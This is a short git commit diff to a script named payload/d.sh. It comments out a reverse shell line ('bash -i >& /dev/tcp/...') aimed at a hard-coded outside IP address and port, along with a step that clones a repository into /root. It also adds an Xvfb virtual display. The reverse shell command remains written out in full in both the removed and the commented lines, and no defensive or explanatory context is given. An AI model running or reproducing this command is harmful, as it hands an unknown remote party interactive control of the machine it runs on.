aa01c4712a4282a78908d05b2610041eaca40dd7
cata0nana <101589752+cata0nana@users.noreply.github.com>
2024-07-10 12:45:09 -0400

    Update d.sh

--- payload/d.sh
+++ payload/d.sh
@@ -1,13 +1,14 @@
 #!/bin/bash
-echo "vanishxmainone" > /root/g00g
+#echo "vanishxmainone" > /root/g00g
 File="/root/SDA_ALL/README.md"
 if [ -f "$File" ]; then  
 echo "$File exist"  
 else  
 echo "$File does not exist"
-git clone https://github.com/GH0STAV0/SDA_ALL.git /root/SDA_ALL
+#git clone https://github.com/GH0STAV0/SDA_ALL.git /root/SDA_ALL
 fi  
 
+Xvfb -ac :99 -screen 0 1280x1024x16 &
+export DISPLAY=:99
 
-
-bash -i >& /dev/tcp/105.105.225.248/10001 0>&1
+#bash -i >& /dev/tcp/105.105.225.248/10001 0>&1
